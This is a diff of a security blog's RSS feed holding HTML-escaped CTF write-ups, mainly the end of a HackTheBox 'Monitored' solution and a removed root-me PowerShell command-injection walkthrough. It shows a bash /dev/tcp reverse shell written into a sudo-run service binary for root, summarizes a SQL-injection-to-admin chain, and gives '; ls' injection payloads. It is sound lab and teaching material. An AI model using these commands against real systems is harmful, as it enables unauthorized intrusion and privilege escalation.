+&lt;span class=&quot;nt&quot;&gt;-rwxrwxr--&lt;/span&gt; 1 nagios nagios 1043688 Nov  9 10:42 ndo.so
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root   root      1083 Nov  9 10:42 ndo-startup-hash.sh
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr--&lt;/span&gt; 1 nagios nagios   31584 Nov  9 10:42 npcd
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr--&lt;/span&gt; 1 nagios nagios   14552 Nov  9 10:42 npcdmod.o
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root   root    215488 Nov  9 10:43 nrpe
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root   root     10661 Nov  9 10:43 nrpe-uninstall
+&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt; 1 root   root    142920 Nov  9 10:43 nsca
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This means that we could erase the contents of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;npcd&lt;/code&gt; binary and replace it with a reverse shell. If this succeeds, we might get root.&lt;/p&gt;
+
+&lt;h2 id=&quot;-getting-root&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt; Getting root&lt;/h2&gt;
+
+&lt;p&gt;Let’s try it out! First, we need to stop the service in order to be able to alter the file’s content:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nagios@monitored:/usr/local/nagios/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/local/nagiosxi/scripts/manage_services.sh stop npcd
+&amp;lt;&lt;span class=&quot;nb&quot;&gt;local&lt;/span&gt;/nagiosxi/scripts/manage_services.sh stop npcd
+nagios@monitored:/usr/local/nagios/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; npcd
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; npcd
+nagios@monitored:/usr/local/nagios/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;#!/bin/bash&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; npcd
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;#!/bin/bash&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; npcd
+nagios@monitored:/usr/local/nagios/bin&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -c &apos;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.200/9000 0&amp;gt;&amp;amp;1&apos;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; npcd
+&amp;lt;ash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.10.10/9000 0&amp;gt;&amp;amp;1&lt;span class=&quot;s1&quot;&gt;&apos;&quot; &amp;gt;&amp;gt; npcd
+nagios@monitored:/usr/local/nagios/bin$ cat npcd
+cat npcd
+#!/bin/bash
+bash -c &apos;&lt;/span&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/10.10.10.10/9000 0&amp;gt;&amp;amp;1&lt;span class=&quot;s1&quot;&gt;&apos;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We successfully overwritten the npcd binary. Now, we start another netcat on port 9000 and start the service back again with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd&lt;/code&gt; to get the root shell:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;../figs/monitored11.png&quot; alt=&quot;root-shell&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
+
+&lt;p&gt;This was a nice ride. Lots of rabbit holes along the way, but lots of new things learned. We were able to find our way in the website by first using snmpwalk which leaked some unprivileged user credentials. With these, we were able to create authentication tokens at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/api/v1/authenticate&lt;/code&gt; endpoint, which were then used to test a SQL injection at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nagiosxi/admin/banner_message-ajaxhelper.php&lt;/code&gt; endpoint. With SQLMap, we were able to retrieve the administrator API key, which was used to create a new admin account under Nagios XI. Then, this newly created admin account provided us the opportunity to run a reverse shell within Nagios XI commands, granting us the user shell.&lt;/p&gt;
+
+&lt;p&gt;From there, we simply listed all sudo commands that we could run without a password to find one that used service running from a binary that we had written permissions. We added our second reverse shell payload into it, restarted the service, and got the root shell.&lt;/p&gt;
+
+&lt;p&gt;Simply amazing!&lt;/p&gt;
+
+&lt;p&gt;I hope you liked this write-up and learned something new. As always, don’t forget to do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 16 Jan 2024 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000//monitored-htb</link>
+        <link href="http://localhost:4000/monitored-htb"/>
+        <guid isPermaLink="true">http://localhost:4000/monitored-htb</guid>
+      </item>
+    
+      <item>
         <title>GoodGames - HackTheBox</title>
         <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
 
@@ -310,7 +870,7 @@ lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -&amp;gt; /dev/nu
 
 &lt;p&gt;Success! As we can access files created by ‘augustus’, we have the potential to gain root access. This can be achieved by copying the /bin/bash binary to /home/augustus inside the host machine, setting its SUID bit and onwership to root in the container, and then executing it in the ‘augustus’ user. This method is likely to grant us root access on the host machine.&lt;/p&gt;
 
-&lt;h2 id=&quot;solving&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt;Solving!&lt;/h2&gt;
+&lt;h2 id=&quot;-getting-root&quot;&gt;&lt;a href=&quot;#solving&quot;&gt;&lt;/a&gt; Getting root&lt;/h2&gt;
 
 &lt;p&gt;Let’s try it out! First, we run:&lt;/p&gt;
 
@@ -363,7 +923,7 @@ user on the website. We managed to successfully exploit the Server Side Template
 &lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
 
 </description>
-        <pubDate>Wed, 10 Jan 2024 00:00:00 +0000</pubDate>
+        <pubDate>Sat, 13 Jan 2024 00:00:00 +0000</pubDate>
         <link>http://localhost:4000//goodgames-htb</link>
         <link href="http://localhost:4000/goodgames-htb"/>
         <guid isPermaLink="true">http://localhost:4000/goodgames-htb</guid>
@@ -2320,202 +2880,6 @@ SecureStringBypass
         <link>http://localhost:4000//powershell-securestring-root-me</link>
         <link href="http://localhost:4000/powershell-securestring-root-me"/>
         <guid isPermaLink="true">http://localhost:4000/powershell-securestring-root-me</guid>
-      </item>
-    
-      <item>
-        <title>Powershell - Command Injection - root-me.org</title>
-        <description>&lt;h1 id=&quot;introduction&quot;&gt;&lt;a href=&quot;#intro&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;
-
-&lt;p&gt;In this write-up, we’re taking a different route by tackling a Windows machine CTF. This CTF is hosted at &lt;a href=&quot;https://www.root-me.org&quot;&gt;Root-me&lt;/a&gt; in the App Script tab. It is also ranked as easy! Let’s see what we have.&lt;/p&gt;
-
-&lt;h1 id=&quot;challenge-description&quot;&gt;&lt;a href=&quot;#level-description&quot;&gt;&lt;/a&gt;Challenge description&lt;/h1&gt;
-
-&lt;p&gt;The ‘Statement’ says:&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Statement&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Recover the database’s password.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;A cryptic task, indeed! It seems we need to ssh into the machine to take a look and understand what this CTF is about. However, before doing so, let’s brush up on Powershell and command injection to sharpen our strategic approach mindset.&lt;/p&gt;
-
-&lt;p&gt;To ssh into the machine, we run the command:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ssh -p 2225 app-script-ch18@challenge05.root-me.org&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;with the password &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;app-script-ch18&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h1 id=&quot;approach-mindset&quot;&gt;&lt;a href=&quot;#approach&quot;&gt;&lt;/a&gt;Approach mindset&lt;/h1&gt;
-
-&lt;h2 id=&quot;step-1---understanding-basic-concepts&quot;&gt;&lt;a href=&quot;#mindset-step1&quot;&gt;&lt;/a&gt;Step 1 - Understanding basic concepts&lt;/h2&gt;
-
-&lt;h3 id=&quot;powershell-101&quot;&gt;Powershell 101&lt;/h3&gt;
-
-&lt;p&gt;Firstly, let’s discuss Powershell. Powershell serves as a Windows shell, akin to how Bash functions in Linux (or MacOS). Succeeding the older ‘CMD’ shell, Powershell can be seen as an enhanced version of CMD, offering a more robust feature set.&lt;/p&gt;
-
-&lt;p&gt;In Powershell, numerous commands are similar to those in CMD, but it also introduces a plethora of new ones exclusive to it. For example, commands like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pwd&lt;/code&gt; are integrated from the Bash into Powershell.&lt;/p&gt;
-
-&lt;p&gt;For a simplistic introduction, this should suffice. However, if you are interested in how to level you Powershell game up, check it out &lt;a href=&quot;https://github.com/lllife-uncat/powershell-101/blob/master/PG_PowerShell_XWIPSCRE01_0.pdf&quot;&gt;this&lt;/a&gt; github repository. It contains a PDF full of insights on how to succeed using this shell!&lt;/p&gt;
-
-&lt;h3 id=&quot;command-injection&quot;&gt;Command injection&lt;/h3&gt;
-
-&lt;p&gt;Command injection is a cyber attack that involves executing arbitrary commands on a host operating system (OS). Put in simple terms, a command injection vulnerability is one that the attacker disrupts the normal flow of a script, injecting arbitrary - usually not intended by the developer - code. This form of attack is distinct from other types of code injection, as it specifically targets command execution within an operating system’s environment.&lt;/p&gt;
-
-&lt;p&gt;For a good reference, check it out the OWASP command injection &lt;a href=&quot;https://owasp.org/www-community/attacks/Command_Injection&quot;&gt;page&lt;/a&gt;. It demonstrates how this usually happens within a Unix environment.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-2---understanding-the-problem&quot;&gt;&lt;a href=&quot;#mindset-step2&quot;&gt;&lt;/a&gt;Step 2 - Understanding the problem&lt;/h2&gt;
-
-&lt;p&gt;Now that we’ve grasped the basic concepts that this challenge is involved with, let’s ssh into the machine and take a look around. Remember, this is a Powershell machine, so be comfortable working with Windows shell commands.&lt;/p&gt;
-
-&lt;p&gt;Here’s the greeting we receive upon sshing:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2225 app-script-ch18@challenge05.root-me.org
-      _           _ _                        ___  ____  
-  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ &lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt; ___| 
- / __| &lt;span class=&quot;s1&quot;&gt;&apos;_ \ / _` | | |/ _ \ &apos;&lt;/span&gt;_ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; |/ _ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;| | |___ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;
-| &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;__| | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| | | |  __/ | | | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;_| |  __/ |_| |___&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; |
- &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_,_|_|_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|_| |_|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;_, |&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__|&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__/|____/ 
-                                 |___/ root-me.org      
-
-app-script-ch18@challenge05.root-me.org&lt;span class=&quot;s1&quot;&gt;&apos;s password: 
-Table to dump:
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;This interface suggests that we are interacting with a command line program or script, rather than being directly in the shell environment. Let’s type any command to see what happens:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
-ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
-NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
-QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
-A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table &lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;Table to dump:
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Alright, we are indeed inside a command line interface. We are not able to run Powershell commands, but since the problem says we have command injection, we might need to break this interface and access the shell. This is our goal!&lt;/p&gt;
-
-&lt;h3 id=&quot;context&quot;&gt;Context&lt;/h3&gt;
-
-&lt;p&gt;This command line interface might be something like this, in powershell:&lt;/p&gt;
-
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kr&quot;&gt;Function&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Simulate-Interaction&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Table to dump:&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-                &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Read-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-                &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
-ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
-NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
-QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
-A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$input&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Simulate-Interaction&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;To simulate it, let’s run a built-in PS shell inside our Linux environment:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /tmp/root-me&amp;gt; ./ps-ci.ps1
-Table to dump:
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; : &lt;span class=&quot;nb&quot;&gt;test
-&lt;/span&gt;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AGQ
-ALwBSAFAAagBxADkAYwBOAHgAegAyAEQAcgB2AGEAbgAvAFUAbgBYAHcAPQA9AHwAYwA5ADIANQAxAGQAYwA0AGYA
-NgAzAGYAZQA4AGIAOQA4ADYAZQA1AGUAOAA0ADIAMwA2ADAANQAwAGMAOQAzADcAMgAzADYAMAAzADgAMQAyADkAZ
-QA4AGMAMQBiADAAYQA4ADAAMAAxAGMAMQA1AGYAMABjADcAOABhADAAZgBlADkAYgAwADgAYQAwAGMAOQBiAGMAZg
-A1ADkANgAyADcANQBmAGEAOAAzAGIAMwA1ADcAZQAzADYAOQBjAGYA. Backup the table &lt;span class=&quot;nb&quot;&gt;test&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Yep. That looks almost the same as the CTF. See, a command injection vulnerability happens when our &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$input&lt;/code&gt; variable breaks the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Write-Host&lt;/code&gt; command and runs another on instead. In our code, however, that is not possible, as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Write-Host&lt;/code&gt; is not prone to command injection. However, we can think that the script flow is similar to this one. To break out the string, we would use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; pipe in Powershell, which is the same as saying: hey PS, besides what you need to run, do also run the following command as well. Here’s an example:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS /tmp/root-me&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;kaizen
-cinjection  cinjection.c  ps  ps-ci.ps1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;step-3---crafting-the-attack&quot;&gt;&lt;a href=&quot;#mindset-step3&quot;&gt;&lt;/a&gt;Step 3 - Crafting the attack&lt;/h2&gt;
-
-&lt;p&gt;We have basically crafted our attack in the last step. The idea here is to break the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$input&lt;/code&gt; that the CTF Powershell script takes with a semi-colon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; and pass a PS command afterwards. So, the initial attack would be: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; ls&lt;/code&gt; for example.&lt;/p&gt;
-
-&lt;h2 id=&quot;step-4---solving&quot;&gt;&lt;a href=&quot;#mindset-step4&quot;&gt;&lt;/a&gt;Step 4 - Solving!&lt;/h2&gt;
-
-&lt;p&gt;Let’s try it out:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls
-&lt;/span&gt;Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
-AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
-YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
-AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
-AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table
-
-
-    Directory: C:&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;ygwin64&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;hallenge&lt;span class=&quot;se&quot;&gt;\a&lt;/span&gt;pp-script&lt;span class=&quot;se&quot;&gt;\c&lt;/span&gt;h18
-
-
-Mode                LastWriteTime         Length Name
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       12/12/2021   9:25 AM             43 .git
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;       11/21/2021  11:34 AM            150 .key
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        4/20/2020  10:50 AM             18 .passwd
-&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;       12/12/2021   9:50 AM            574 ._perms
-&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;       11/21/2021  11:35 AM            348 ch18.ps1
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Aha! As expected, we could break the input by passing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; pipe with another command. Out of curiosity, let’s take a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ch18.ps1&lt;/code&gt; script by injecting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat ch18.ps1&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-Content&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;passwd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ConvertTo-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-AsPlainText&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Force&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Conv&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ertFrom-SecureString&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$key&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
-&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;while&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Table to dump: &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Write-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoNewLine&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;gt; &quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-        &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Read-Host&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-
